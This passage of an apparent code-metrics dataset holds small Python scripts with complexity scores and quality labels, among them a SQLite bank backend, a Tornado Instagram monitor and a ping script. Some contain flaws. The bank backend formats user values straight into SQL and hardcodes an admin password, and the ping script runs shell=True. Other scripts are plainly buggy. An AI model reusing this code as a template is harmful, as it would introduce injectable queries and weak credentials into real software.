            self.display.blit(self.surface, (0, 0))
            pygame.display.flip()

        pygame.quit()

    def update(self, events):
        for ev in events:
            if ev.type == pygame.MOUSEBUTTONDOWN and ev.button == 1:
                self.queue.append(ev.pos)

        if not len(self.queue):
            return

        point = self.queue.pop(0)

        pixArr = pygame.PixelArray(self.surface)

        if pixArr[point[0], point[1]] == self.surface.map_rgb((255, 255, 255)):
            return

        pixArr[point[0], point[1]] = (255, 255, 255)

        left = (point[0] - 1, point[1])
        right = (point[0] + 1, point[1])
        top = (point[0], point[1] + 1)
        bottom = (point[0], point[1] - 1)

        if (
            self.inBounds(left)
            and left not in self.queue
            and pixArr[left[0], left[1]] == self.surface.map_rgb((0, 0, 0))
        ):
            self.queue.append(left)
        if (
            self.inBounds(right)
            and right not in self.queue
            and pixArr[right[0], right[1]] == self.surface.map_rgb((0, 0, 0))
        ):
            self.queue.append(right)
        if (
            self.inBounds(top)
            and top not in self.queue
            and pixArr[top[0], top[1]] == self.surface.map_rgb((0, 0, 0))
        ):
            self.queue.append(top)
        if (
            self.inBounds(bottom)
            and bottom not in self.queue
            and pixArr[bottom[0], bottom[1]] == self.surface.map_rgb((0, 0, 0))
        ):
            self.queue.append(bottom)

        del pixArr

    def inBounds(self, coord):
        if coord[0] < 0 or coord[0] >= self.window_width:
            return False
        elif coord[1] < 0 or coord[1] >= self.window_height:
            return False
        return True


if __name__ == ""__main__"":
    import sys

    floodfill = FloodFill(sys.argv[1], sys.argv[2])
    floodfill.run()
",4019,78,99,28,3,0,5,5.0,42,44,11,91.0,75,,135,505.2151495922013,867.5457418847832,6.673333333333333,bajo,Yes,False,False,,id90
Python Program to Display Fibonacci Sequence Using Recursion.py,"def recur_fibo(n):
   if n <= 1:
       return n
   else:
       return(recur_fibo(n-1) + recur_fibo(n-2))

nterms = 10

# check if the number of terms is valid
if nterms <= 0:
   print(""Please enter a positive integer"")
else:
   print(""Fibonacci sequence:"")
   for i in range(nterms):
       print(recur_fibo(i))
",314,12,12,2,1,1,0,1.0,2,5,3,10.0,7,,15,24.406371956566694,49.82892142331044,2.142857142857143,alto,No,False,False,Low,id91
Print_List_of_Odd_Numbers.py,"# master
# Another best method to do this

n = map(list(int, input().split()))
odd_list = list(i for i in n if i % 2 != 0)
print(odd_list)
exit()

# CALCULATE NUMBER OF ODD NUMBERS

# CALCULATE NUMBER OF ODD NUMBERS WITHIN A GIVEN LIMIT
# master

n = int(input(""Enter the limit : ""))  # user input

if n <= 0:
    print(""Invalid number, please enter a number greater than zero!"")
else:
    odd_list = [i for i in range(1, n + 1, 2)]  # creating string with number ""i""
    print(odd_list)  # in range from 1 till ""n"".


#     printing odd and even number in same program
n = map(list(int, input().split()))
even = []
odd = []
for i in range(n):
    if i % 2 == 0:
        even.append(i)
    else:
        odd.append(i)
",718,18,18,7,9,6,0,0.0,0,6,5,12.0,7,,18,31.26112492884004,64.52932501298082,4.285714285714286,alto,No,True,False,Low,id92
get_likes_on_FB.py,"from __future__ import print_function

import json
import sys
import urllib

accessToken = ""TOKENVALUE""  # YOUR ACCESS TOKEN GETS INSERTED HERE
userId = sys.argv[1]  # USERID
limit = 100

url = (
    ""https://graph.facebook.com/""
    + userId
    + ""/posts?access_token=""
    + accessToken
    + ""&limit=""
    + str(limit)
)  # FB Link
data = json.load(urllib.urlopen(url))
id = 0

print(str(id))

for item in data[""data""]:
    time = item[""created_time""][11:19]
    date = item[""created_time""][5:10]
    year = item[""created_time""][0:4]

if ""shares"" in item:
    num_share = item[""shares""][""count""]
else:
    num_share = 0
if ""likes"" in item:
    num_like = item[""likes""][""count""]
else:
    num_like = 0

id += 1

print(
    str(id)
    + ""\t""
    + time.encode(""utf-8"")
    + ""\t""
    + date.encode(""utf-8"")
    + ""\t""
    + year.encode(""utf-8"")
    + ""\t""
    + str(num_share)
    + ""\t""
    + str(num_like)
)
",913,28,44,8,3,0,0,0.0,0,18,2,36.0,31,,54,155.58008562199316,272.3972824453565,1.1612903225806452,medio,No,False,False,Low,id93
memorygame.py,"from random import *
from turtle import *
from freegames import path

car = path(""car.gif"")
tiles = list(range(32)) * 2
state = {""mark"": None}
hide = [True] * 64


def square(x, y):
    ""Draw white square with black outline at (x, y).""
    up()
    goto(x, y)
    down()
    color(""black"", ""white"")
    begin_fill()
    for count in range(4):
        forward(50)
        left(90)
    end_fill()


def index(x, y):
    ""Convert (x, y) coordinates to tiles index.""
    return int((x + 200) // 50 + ((y + 200) // 50) * 8)


def xy(count):
    ""Convert tiles count to (x, y) coordinates.""
    return (count % 8) * 50 - 200, (count // 8) * 50 - 200


def tap(x, y):
    ""Update mark and hidden tiles based on tap.""
    spot = index(x, y)
    mark = state[""mark""]

    if mark is None or mark == spot or tiles[mark] != tiles[spot]:
        state[""mark""] = spot
    else:
        hide[spot] = False
        hide[mark] = False
        state[""mark""] = None


def draw():
    ""Draw image and tiles.""
    clear()
    goto(0, 0)
    shape(car)
    stamp()

    for count in range(64):
        if hide[count]:
            x, y = xy(count)
            square(x, y)

    mark = state[""mark""]

    if mark is not None and hide[mark]:
        x, y = xy(mark)
        up()
        goto(x + 2, y)
        color(""black"")
        write(tiles[mark], font=(""Arial"", 30, ""normal""))

    update()
    ontimer(draw, 100)


shuffle(tiles)
setup(420, 420, 370, 0)
addshape(car)
hideturtle()
tracer(False)
onscreenclick(tap)
draw()
done()
",1510,62,56,18,0,5,0,,13,21,11,43.0,36,,64,224.1710478569335,355.4936865073688,6.569444444444445,bajo,No,False,False,Medium-High,id94
Shivaansh.py,"from __future__ import print_function

x = input(""Enter a number: "")
for i in range(1, 11, 1):
    print(x, ""x"", i, ""="", (x * i))
",135,4,4,1,0,0,0,0.0,0,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,No,True,False,Low,id95
passwordGen.py,"import random

lChars = ""abcdefghijklmnopqrstuvwxyz""
uChars = ""ABCDEFGHIJKLMNOPQRSTUVWXYZ""
digits = ""1234567890""
specialChars = ""!@#$%^&*-_+=""

passLen = 10  # actual generated password length will be this length + 1
myPass = """"

for i in range(passLen):
    while (len(myPass)) <= 2:
        index = random.randrange(len(lChars))
        myPass = myPass + lChars[index]
        myPassLen = len(myPass)
    while (len(myPass)) <= 5:
        index = random.randrange(len(digits))
        myPass = myPass + digits[index]
        myPassLen = len(myPass)
    while (len(myPass)) <= 7:
        index = random.randrange(len(specialChars))
        myPass = myPass + specialChars[index]
        myPassLen = len(myPass)
    while (len(myPass)) <= 10:
        index = random.randrange(len(uChars))
        myPass = myPass + uChars[index]
        myPassLen = len(myPass)

print(myPass)
",904,25,25,4,1,0,0,0.0,0,8,2,16.0,13,,24,50.1057163358342,93.76537429460444,1.2307692307692308,medio,No,False,True,Low,id96
backend.py,"import sqlite3


# making connection with database
def connect_database():
    global conn
    global cur
    conn = sqlite3.connect(""bankmanaging.db"")

    cur = conn.cursor()

    cur.execute(
        ""create table if not exists bank (acc_no int, name text, age int, address text, balance int, account_type text, mobile_number int)""
    )
    cur.execute(
        ""create table if not exists staff (name text, pass text,salary int, position text)""
    )
    cur.execute(""create table if not exists admin (name text, pass text)"")
    cur.execute(""insert into admin values('arpit','123')"")
    conn.commit()
    cur.execute(""select acc_no from bank"")
    acc = cur.fetchall()
    global acc_no
    if len(acc) == 0:
        acc_no = 1
    else:
        acc_no = int(acc[-1][0]) + 1


# check admin dtails in database
def check_admin(name, password):
    cur.execute(""select * from admin"")
    data = cur.fetchall()

    if data[0][0] == name and data[0][1] == password:
        return True
    return


# create employee in database
def create_employee(name, password, salary, positon):
    print(password)
    cur.execute(""insert into staff values(?,?,?,?)"", (name, password, salary, positon))
    conn.commit()


# check employee details in dabase for employee login
def check_employee(name, password):
    print(password)
    print(name)
    cur.execute(""select name,pass from staff"")
    data = cur.fetchall()
    print(data)
    if len(data) == 0:
        return False
    for i in range(len(data)):
        if data[i][0] == name and data[i][1] == password:
            return True

    return False


# create customer details in database
def create_customer(name, age, address, balance, acc_type, mobile_number):
    global acc_no
    cur.execute(
        ""insert into bank values(?,?,?,?,?,?,?)"",
        (acc_no, name, age, address, balance, acc_type, mobile_number),
    )
    conn.commit()
    acc_no = acc_no + 1
    return acc_no - 1


# check account in database
def check_acc_no(acc_no):
    cur.execute(""select acc_no from bank"")
    list_acc_no = cur.fetchall()

    for i in range(len(list_acc_no)):
        if list_acc_no[i][0] == int(acc_no):
            return True
    return False


# get all details of a particular customer from database
def get_details(acc_no):
    cur.execute(""select * from bank where acc_no=?"", (acc_no))
    global detail
    detail = cur.fetchall()
    print(detail)
    if len(detail) == 0:
        return False
    else:
        return (
            detail[0][0],
            detail[0][1],
            detail[0][2],
            detail[0][3],
            detail[0][4],
            detail[0][5],
            detail[0][6],
        )


# add new balance of customer in bank database
def update_balance(new_money, acc_no):
    cur.execute(""select balance from bank where acc_no=?"", (acc_no,))
    bal = cur.fetchall()
    bal = bal[0][0]
    new_bal = bal + int(new_money)

    cur.execute(""update bank set balance=? where acc_no=?"", (new_bal, acc_no))
    conn.commit()


# deduct balance from customer bank database
def deduct_balance(new_money, acc_no):
    cur.execute(""select balance from bank where acc_no=?"", (acc_no,))
    bal = cur.fetchall()
    bal = bal[0][0]
    if bal < int(new_money):
        return False
    else:
        new_bal = bal - int(new_money)

        cur.execute(""update bank set balance=? where acc_no=?"", (new_bal, acc_no))
        conn.commit()
        return True


# gave balance of a particular account number from database
def check_balance(acc_no):
    cur.execute(""select balance from bank where acc_no=?"", (acc_no))
    bal = cur.fetchall()
    return bal[0][0]


# update_name_in_bank_table
def update_name_in_bank_table(new_name, acc_no):
    print(new_name)
    conn.execute(""update bank set name='{}' where acc_no={}"".format(new_name, acc_no))
    conn.commit()


# update_age_in_bank_table
def update_age_in_bank_table(new_name, acc_no):
    print(new_name)
    conn.execute(""update bank set age={} where acc_no={}"".format(new_name, acc_no))
    conn.commit()


# update_address_in_bank_table
def update_address_in_bank_table(new_name, acc_no):
    print(new_name)
    conn.execute(
        ""update bank set address='{}' where acc_no={}"".format(new_name, acc_no)
    )
    conn.commit()


# list of all customers in bank
def list_all_customers():
    cur.execute(""select * from bank"")
    deatil = cur.fetchall()

    return deatil


# delete account from database
def delete_acc(acc_no):
    cur.execute(""delete from bank where acc_no=?"", (acc_no))
    conn.commit()


# show employees detail from staff table
def show_employees():
    cur.execute(""select name, salary, position,pass from staff"")
    detail = cur.fetchall()
    return detail


# return all money in bank
def all_money():
    cur.execute(""select balance from bank"")
    bal = cur.fetchall()
    print(bal)
    if len(bal) == 0:
        return False
    else:
        total = 0
        for i in bal:
            total = total + i[0]
        return total


# return a list of all employees name
def show_employees_for_update():
    cur.execute(""select * from staff"")
    detail = cur.fetchall()
    return detail


# update employee name from data base
def update_employee_name(new_name, old_name):
    print(new_name, old_name)
    cur.execute(""update staff set name='{}' where name='{}'"".format(new_name, old_name))
    conn.commit()


def update_employee_password(new_pass, old_name):
    print(new_pass, old_name)
    cur.execute(""update staff set pass='{}' where name='{}'"".format(new_pass, old_name))
    conn.commit()


def update_employee_salary(new_salary, old_name):
    print(new_salary, old_name)
    cur.execute(
        ""update staff set salary={} where name='{}'"".format(new_salary, old_name)
    )
    conn.commit()


def update_employee_position(new_pos, old_name):
    print(new_pos, old_name)
    cur.execute(
        ""update staff set position='{}' where name='{}'"".format(new_pos, old_name)
    )
    conn.commit()


# get name and balance from bank of a particular account number
def get_detail(acc_no):
    cur.execute(""select name, balance from bank where acc_no=?"", (acc_no))
    details = cur.fetchall()
    return details


def check_name_in_staff(name):
    cur = conn.cursor()
    cur.execute(""select name from staff"")
    details = cur.fetchall()

    for i in details:
        if i[0] == name:
            return True
    return False
",6421,150,171,57,20,20,0,24.0,39,20,6,39.0,35,,59,195.03468059740075,316.0955682724669,3.342857142857143,bajo,No,False,False,Medium,id97
insta_api.py,"from concurrent.futures import ThreadPoolExecutor

import tornado.ioloop
import tornado.web
from tornado.concurrent import run_on_executor
from tornado.gen import coroutine

# import file
try:
    from instagram_monitering.insta_datafetcher import *
    from instagram_monitering.subpinsta import *
except:
    from insta_datafetcher import *
    from subpinsta import *
MAX_WORKERS = 10


class StartHandlerinsta(tornado.web.RequestHandler):
    executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)

    @run_on_executor
    def background_task(self, user, tags, type, productId):
        try:
            instasubprocess(user=user, tags=tags, type=type, productId=productId)
        except:
            print(""error::background_task>>"", sys.exc_info()[1])

    @coroutine
    def get(self):
        try:
            q = self.get_argument(""q"")
            user = self.get_argument(""userId"")
            type = self.get_argument(""type"")
            productId = self.get_argument(""productId"")
        except:
            self.send_error(400)
        if "" "" in q:
            q = q.replace("" "", """")
        self.background_task(user=user, tags=q, type=type, productId=productId)
        temp = {}
        temp[""query""] = q
        temp[""userId""] = user
        temp[""status""] = True
        temp[""productId""] = productId
        print(
            ""{0}, {1}, {2}, {3}"".format(
                temp[""userId""], temp[""productId""], temp[""query""], temp[""status""]
            )
        )
        self.write(ujson.dumps(temp))


class StopHandlerinsta(tornado.web.RequestHandler):
    def get(self):
        try:
            q = self.get_argument(""q"")
            user = self.get_argument(""userId"")
            # tags = self.get_argument(""hashtags"")
            productId = self.get_argument(""productId"")
        except:
            self.send_error(400)
        obj = InstaPorcessClass()
        result = obj.deletProcess(tags=q, user=user, productId=productId)
        temp = {}
        temp[""query""] = q
        temp[""userId""] = user
        temp[""productId""] = productId
        temp[""status""] = result
        print(
            ""{0}, {1}, {2}, {3}"".format(
                temp[""userId""], temp[""productId""], temp[""query""], temp[""status""]
            )
        )
        self.write(ujson.dumps(temp))


class StatusHandlerinsta(tornado.web.RequestHandler):
    def get(self):
        try:
            q = self.get_argument(""q"")
            user = self.get_argument(""userId"")
            productId = self.get_argument(""productId"")
            # tags = self.get_argument(""hashtags"")
        except:
            self.send_error(400)
        obj = InstaPorcessClass()
        result = obj.statusCheck(tags=q, user=user, productId=productId)
        temp = {}
        temp[""query""] = q
        temp[""userId""] = user
        temp[""status""] = result
        temp[""productId""] = productId
        print(
            ""{0}, {1}, {2}, {3}"".format(
                temp[""userId""], temp[""productId""], temp[""query""], temp[""status""]
            )
        )
        self.write(ujson.dumps(temp))


# class SenderHandlerinsta(tornado.web.RequestHandler):
#     def get(self):
#         try:
#             q = self.get_argument(""q"")
#             user = self.get_argument(""userId"")
#             type = self.get_argument(""type"")
#             productId = self.get_argument(""productId"")
#         except:
#             self.send_error(400)
#         recordsobj = DBDataFetcher(user=user, tags=q, type=type, productId=productId)
#         data = recordsobj.dbFetcher()
#         self.write(data)


class SenderHandlerinstaLess(tornado.web.RequestHandler):
    def get(self):
        try:
            q = self.get_argument(""q"")
            user = self.get_argument(""userId"")
            type = self.get_argument(""type"")
            productId = self.get_argument(""productId"")
            date = self.get_argument(""date"")
            limit = self.get_argument(""limit"")
        except:
            self.send_error(400)
        recordsobj = DBDataFetcher(user=user, tags=q, type=type, productId=productId)
        data = recordsobj.DBFetcherLess(limit=limit, date=date)
        # print(""{0}, {1}, {2}, {3}"".format(temp[""userId""], temp[""productId""], temp[""query""], temp[""status""]))
        self.write(data)


class SenderHandlerinstaGreater(tornado.web.RequestHandler):
    def get(self):
        try:
            q = self.get_argument(""q"")
            user = self.get_argument(""userId"")
            type = self.get_argument(""type"")
            productId = self.get_argument(""productId"")
            date = self.get_argument(""date"")
            limit = self.get_argument(""limit"")
        except:
            self.send_error(400)
        recordsobj = DBDataFetcher(user=user, tags=q, type=type, productId=productId)
        data = recordsobj.DBFetcherGreater(limit=limit, date=date)
        # print(""{0}, {1}, {2}, {3}"".format(temp[""userId""], temp[""productId""], temp[""query""], temp[""status""]))
        self.write(data)


if __name__ == ""__main__"":
    application = tornado.web.Application(
        [
            (r""/instagram/monitoring/start"", StartHandlerinsta),
            (r""/instagram/monitoring/stop"", StopHandlerinsta),
            (r""/instagram/monitoring/status"", StatusHandlerinsta),
            (r""/instagram/monitoring/less"", SenderHandlerinstaLess),
            (r""/instagram/monitoring/greater"", SenderHandlerinstaGreater),
        ]
    )

    application.listen(7074)
    print(""server running"")
    tornado.ioloop.IOLoop.instance().start()
",5529,106,126,19,17,17,0,,29,2,2,4.0,4,,6,10.0,15.509775004326936,1.0,medio,Yes,False,False,Low,id98
automail.py,"#find documentation for ezgmail module at https://pypi.org/project/EZGmail/
#simple simon says module that interacts with google API to read the subject line of an email and respond to ""Simon says:""
#DO NOT FORGET TO ADD CREDENTIALS.JSON AND TOKEN.JSON TO .GITIGNORE!!!

import ezgmail, re, time

check = True
while check:
    recThreads = ezgmail.recent()
    findEmail = re.compile(r'<(.*)@(.*)>')
    i = 0
    for msg in recThreads:
        subEval = recThreads[i].messages[0].subject.split(' ')
        sender = recThreads[i].messages[0].sender
        if subEval[0] == 'Simon' and subEval[1] == 'says:':
            subEval.remove('Simon')
            subEval.remove('says:')
            replyAddress = findEmail.search(sender).group(0).replace('<','').replace('>','')
            replyContent = 'I am now doing ' + ' '.join(subEval)
            ezgmail.send(replyAddress, replyContent, replyContent)
            ezgmail._trash(recThreads[i])
        if subEval[0] == 'ENDTASK': #remote kill command
            check = False
        i += 1
    time.sleep(60) #change check frquency; default every minute",1110,20,20,2,5,3,0,0.0,0,6,3,12.0,12,,18,47.77443751081735,70.32403072095333,1.5,alto,No,False,False,Low,id99
tower_of_hanoi.py,"""""""Tower of Hanoi is a mathematical puzzle where we have three rods and n disks. The objective of the puzzle is to move
    the entire stack to another rod, obeying the following simple rules:
1) Only one disk can be moved at a time.
2) Each move consists of taking the upper disk from one of the stacks and placing it on top of another stack i.e. a disk
    can only be moved if it is the uppermost disk on a stack.
3) No disk may be placed on top of a smaller disk.
APPROACH:
Take an example for 2 disks :
Let rod 1 = 'SOURCE', rod 2 = 'TEMPORARY', rod 3 = 'DESTINATION'.

Step 1 : Shift first disk from 'SOURCE' to 'TEMPORARY'.
Step 2 : Shift second disk from 'SOURCE' to 'DESTINATION'.
Step 3 : Shift first disk from 'TEMPORARY' to 'DESTINATION'.

The pattern here is :
Shift 'n-1' disks from 'SOURCE' to 'TEMPORARY'.
Shift last disk from 'SOURCE' to 'DESTINATION'.
Shift 'n-1' disks from 'TEMPORARY' to 'DESTINATION'.
""""""


def toh(n, s, t, d):
    if n == 1:
        print(s, ""-->"", d)
        return
    toh(n - 1, s, d, t)
    print(s, ""-->"", d)
    toh(n - 1, t, s, d)


if __name__ == ""__main__"":
    while 1:

        n = int(input(""""""Enter number of disks:""""""))

        if n < 0:
            print(""Try Again with a valid input"")
            continue
        elif n == 0:
            break
        toh(n, ""Source"", ""Temporary"", ""Destination"")

        print(""ENTER 0 TO EXIT"")
",1390,18,17,9,0,0,17,1.0,2,6,3,12.0,6,,18,20.264662506490406,57.058650025961626,3.0,alto,No,True,False,Low,id100
remove a character from a file and rewrite.py,"#Remove all the lines that contain the character `a' in a file and write it to another file.
f=open(""test1.txt"",""r"") #opening file test1.txt
lines = f.readlines() #saved lines
print(""Original file is :"")
print(lines)
f.close()
 
# Rewriting lines 

e=open(""test3.txt"",""w"") # file containing lines with 'a'
f=open(""test1.txt"",""w"") # file containing lines without 'a'
for line in lines:
 if 'a' in line or 'A' in line:
  e.write(line)
 else:        
  f.write(line)
    
e.close()
f.close()   

f=open(""test1.txt"",""r"")   
lines=f.readlines()

e=open(""test3.txt"",""r"")   
lines1=e.readlines()

print(""\n"")

print(""Files without letter a:"")
print(lines)
print(""\n"")

print(""Files with letter a:"")
print(lines1)

e.close()
f.close()
",727,26,26,9,6,2,0,0.0,0,3,2,6.0,5,,9,13.60964047443681,25.26619429851844,1.2,alto,No,False,False,Low,id101
dictator.py,"# from speakListen import hear
# from speakListen import long_hear
from speakListen import *

from colorama import Fore, Back, Style

def big_text():
    print(""By default, I will record your voice for 60 seconds.\nDo you want to change this default timing?"")
    speak(""By default, I will record your voice for 60 seconds.\nDo you want to change this default timing?"")
    print(Fore.YELLOW + ""Yes or No"")
    query = hear().lower()

    duration_time = 0

    if  ""yes"" in query or ""es"" in query or ""ye"" in query or ""s"" in query:

        print(""Please enter the time(in seconds) for which I shall record your speech - "", end = '')
        duration_time = int(input().strip())

        print(""\n"")
    else:
        duration_time = 60
    speak(f""I will record for {duration_time} seconds!"")
    text = long_hear(duration_time)
    print(""\n"" + Fore.LIGHTCYAN_EX + text)

def colours():
    text = ""Colour""
    print(Fore.BLACK + text)
    print(Fore.GREEN + text)
    print(Fore.YELLOW + text)
    print(Fore.RED + text)
    print(Fore.BLUE + text)
    print(Fore.MAGENTA + text)
    print(Fore.CYAN + text)
    print(Fore.WHITE + text)
    print(Fore.LIGHTBLACK_EX + text)
    print(Fore.LIGHTRED_EX + text)
    print(Fore.LIGHTGREEN_EX + text)
    print(Fore.LIGHTYELLOW_EX + text)
    print(Fore.LIGHTBLUE_EX + text)
    print(Fore.LIGHTMAGENTA_EX + text)
    print(Fore.LIGHTCYAN_EX + text)
    print(Fore.LIGHTWHITE_EX + text)

#big_text()
#colours()",1504,35,35,8,4,4,0,2.0,6,24,3,50.0,32,,74,164.75488750216346,379.5669432539275,2.34375,medio,No,True,False,Low-Medium,id102
Fibonacci_sequence_recursive_sol.py,"def fib(term):
    if term <= 1:
        return term
    else:
        return fib(term - 1) + fib(term - 2)


# Change this value to adjust the number of terms in the sequence.
number_of_terms = int(input())
for i in range(number_of_terms):
    print(fib(i))
",259,8,8,2,1,1,0,1.0,2,4,3,8.0,5,,12,16.36452797660028,36.0,2.4,alto,No,True,False,Low,id103
sum_of_digits_of_a_number.py,"import sys

def get_integer_input(prompt, attempts):
    for i in range(attempts, 0, -1):
        try:
            n = int(input(prompt))
            return n
        except ValueError:
            print(""Enter an integer only"")
            print(f""{i-1} {'chance' if i-1 == 1 else 'chances'} left"")
    return None

def sum_of_digits(n):
    total = 0
    while n > 0:
        total += n % 10
        n //= 10
    return total

chances = 3
number = get_integer_input(""Enter a number: "", chances)

if number is None:
    print(""You've used all your chances."")
    sys.exit()

result = sum_of_digits(number)
print(f""The sum of the digits of {number} is: {result}"")
",664,23,23,5,0,0,0,2.0,6,9,8,17.0,10,,26,57.21928094887362,108.41805003750012,6.8,medio,No,True,False,Low-Medium,id104
test_XOR_cipher.py,"#
# Test XORCipher
# **************
#
# Test automation software created by Kevin M. Thomas 09/29/19.
# Test automation software Modified by Kevin M. Thomas 09/29/19.
# CC BY 4.0
#
# Test XORCipher is the test automation suite for the XORCipher created by
# Christian Bender.
# Usage: python test_XOR_cipher.py
#


import unittest
from unittest import TestCase, mock

from XOR_cipher import XORCipher


class TestXORCipher(TestCase):
    """"""
    Test XORCipher class.
    """"""

    def setUp(self):
        """"""
        The SetUp call with commented values in the event one needs
        to instantiate mocked objects regarding the XORCipher class.
        """"""

        # key = mock.MagicMock()
        # self.XORCipher_1 = XORCipher(key)
        pass

    @mock.patch(""XOR_cipher.XORCipher.__init__"")
    def test__init__(self, mock__init__):
        """"""
        Test the __init__ method with commented values in the event
        one needs to instantiate mocked objects on the method.
        """"""

        # self.XORCipher_1.__init__ = mock.MagicMock()
        XORCipher.__init__ = mock.MagicMock()

        # self.XORCipher_1.__init__(1)
        XORCipher.__init__()

        # self.XORCipher_1.__init__.assert_called_with(1)
        XORCipher.__init__.assert_called()

    @mock.patch(""XOR_cipher.XORCipher.encrypt"")
    def test_encrypt(self, mock_encrypt):
        """"""
        Test the encrypt method with mocked values.
        """"""

        ans = mock.MagicMock()
        content = mock.MagicMock()
        key = mock.MagicMock()
        XORCipher.encrypt = mock.MagicMock(return_value=ans)
        XORCipher.encrypt(content, key)

        XORCipher.encrypt.assert_called_with(content, key)

    @mock.patch(""XOR_cipher.XORCipher.decrypt"")
    def test_decrypt(self, mock_decrypt):
        """"""
        Test the decrypt method with mocked values.
        """"""

        ans = mock.MagicMock()
        content = mock.MagicMock()
        key = mock.MagicMock()
        XORCipher.decrypt = mock.MagicMock(return_value=ans)
        XORCipher.decrypt(content, key)

        XORCipher.decrypt.assert_called_with(content, key)

    @mock.patch(""XOR_cipher.XORCipher.encrypt_string"")
    def test_encrypt_string(self, mock_encrypt_string):
        """"""
        Test the encrypt_string method with mocked values.
        """"""

        ans = mock.MagicMock()
        content = mock.MagicMock()
        key = mock.MagicMock()
        XORCipher.encrypt_string = mock.MagicMock(return_value=ans)
        XORCipher.encrypt_string(content, key)

        XORCipher.encrypt_string.assert_called_with(content, key)

    @mock.patch(""XOR_cipher.XORCipher.decrypt_string"")
    def test_decrypt_string(self, mock_decrypt_string):
        """"""
        Test the decrypt_string method with mocked values.
        """"""

        ans = mock.MagicMock()
        content = mock.MagicMock()
        key = mock.MagicMock()
        XORCipher.decrypt_string = mock.MagicMock(return_value=ans)
        XORCipher.decrypt_string(content, key)

        XORCipher.decrypt_string.assert_called_with(content, key)

    @mock.patch(""XOR_cipher.XORCipher.encrypt_file"")
    def test_encrypt_file(self, mock_encrypt_file):
        """"""
        Test the encrypt_file method with mocked values.
        """"""

        file = mock.MagicMock()
        key = mock.MagicMock()
        XORCipher.encrypt_file = mock.MagicMock(return_value=True)
        XORCipher.encrypt_file(file, key)

        XORCipher.encrypt_file.assert_called_with(file, key)

    @mock.patch(""XOR_cipher.XORCipher.decrypt_file"")
    def test_decrypt_file(self, mock_decrypt_file):
        """"""
        Test the decrypt_file method with mocked values.
        """"""

        file = mock.MagicMock()
        key = mock.MagicMock()
        XORCipher.decrypt_string = mock.MagicMock(return_value=True)
        XORCipher.decrypt_string(file, key)

        XORCipher.decrypt_string.assert_called_with(file, key)


if __name__ == ""__main__"":
    unittest.main()
",3971,68,59,31,17,17,29,8.0,10,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,Yes,False,False,Low,id105
ping_servers.py,"from __future__ import print_function

import os  # Load the Library Module
import subprocess  # Load the Library Module
import sys  # Load the Library Module

# Script Name		: ping_servers.py
# Author				: Craig Richards
# Created				: 9th May 2012
# Last Modified		: 14th May 2012
# Version				: 1.1
# Modifications		: 1.1 - 14th May 2012 - CR Changed it to use the config directory to store the server files
# Description	 : This script will, depending on the arguments supplied will ping the
# servers associated with that application group.

filename = sys.argv[0]  # Sets a variable for the script name
if (
    ""-h"" in sys.argv or ""--h"" in sys.argv or ""-help"" in sys.argv or ""--help"" in sys.argv
):  # Help Menu if called
    print(
        """"""
You need to supply the application group for the servers you want to ping, i.e.
    dms
    swaps

Followed by the site i.e.
    155
    bromley""""""
    )
    sys.exit(0)
else:

    if (
        len(sys.argv) < 3
    ):  # If no arguments are passed,display the help/instructions on how to run the script
        sys.exit(
            ""\nYou need to supply the app group. Usage : ""
            + filename
            + "" followed by the application group i.e. \n \t dms or \n \t swaps \n ""
            ""then the site i.e. \n \t 155 or \n \t bromley""
        )

    appgroup = sys.argv[1]  # Set the variable appgroup as the first argument you supply
    site = sys.argv[2]  # Set the variable site as the second argument you supply

    if os.name == ""posix"":  # Check the os, if it's linux then
        myping = ""ping -c 2 ""  # This is the ping command
    elif os.name in (""nt"", ""dos"", ""ce""):  # Check the os, if it's windows then
        myping = ""ping -n 2 ""  # This is the ping command

    if ""dms"" in sys.argv:  # If the argument passed is dms then
        appgroup = ""dms""  # Set the variable appgroup to dms
    elif ""swaps"" in sys.argv:  # Else if the argment passed is swaps then
        appgroup = ""swaps""  # Set the variable appgroup to swaps

    if ""155"" in sys.argv:  # If the argument passed is 155 then
        site = ""155""  # Set the variable site to 155
    elif ""bromley"" in sys.argv:  # Else if the argument passed is bromley
        site = ""bromley""  # Set the variable site to bromley

logdir = os.getenv(""logs"")  # Set the variable logdir by getting the OS environment logs
logfile = (
    ""ping_"" + appgroup + ""_"" + site + "".log""
)  # Set the variable logfile, using the arguments passed to create the logfile
logfilename = os.path.join(
    logdir, logfile
)  # Set the variable logfilename by joining logdir and logfile together
confdir = os.getenv(
    ""my_config""
)  # Set the variable confdir from the OS environment variable - 1.2
conffile = appgroup + ""_servers_"" + site + "".txt""  # Set the variable conffile - 1.2
conffilename = os.path.join(
    confdir, conffile
)  # Set the variable conffilename by joining confdir and conffile together - 1.2

f = open(logfilename, ""w"")  # Open a logfile to write out the output
for server in open(conffilename):  # Open the config file and read each line - 1.2
    ret = subprocess.call(
        myping + server, shell=True, stdout=f, stderr=subprocess.STDOUT
    )  # Run the ping command for each server in the list.
    if ret == 0:  # Depending on the response
        f.write(
            server.strip() + "" is alive"" + ""\n""
        )  # Write out that you can receive a reponse
    else:
        f.write(
            server.strip() + "" did not respond"" + ""\n""
        )  # Write out you can't reach the box

print(""\n\tYou can see the results in the logfile : "" + logfilename)
# Show the location of the logfile
",3642,39,70,12,41,9,0,,0,28,5,58.0,47,,86,272.6753165032857,490.237815760134,3.0851063829787235,medio,No,False,False,Medium,id106
stooge_sort.py,"# See what stooge sort dooes
# https://www.youtube.com/watch?v=vIDkfrSdID8


def stooge_sort_(arr, l, h):
    if l >= h:
        return 0

    # If first element is smaller than last, then swap

    if arr[l] > arr[h]:
        t = arr[l]
        arr[l] = arr[h]
        arr[h] = t

    # If there are more than 2 elements in array
    if h - l + 1 > 2:
        t = (int)((h - l + 1) / 3)

        # Recursively sort first 2 / 3 elements
        stooge_sort_(arr, l, (h - t))

        # Recursively sort last 2 / 3 elements
        stooge_sort_(arr, l + t, (h))

        # Recursively sort first 2 / 3 elements
        stooge_sort_(arr, l, (h - t))


arr = [2, 4, 5, 3, 1]
n = len(arr)

stooge_sort_(arr, 0, n - 1)

print(arr)
",726,16,16,12,7,7,0,1.0,4,12,5,24.0,14,,36,64.91260938324326,152.92539048396907,4.285714285714286,alto,No,False,False,Low-Medium,id107
check_for_sqlite_files.py,"# Script Name	: check_for_sqlite_files.py
# Author		: Craig Richards
# Created		: 07 June 2013
# Last Modified	: 14 February 2016
# Version		: 1.0.1

# Modifications	: 1.0.1 - Remove unecessary line and variable on Line 21

# Description	: Scans directories to check if there are any sqlite files in there

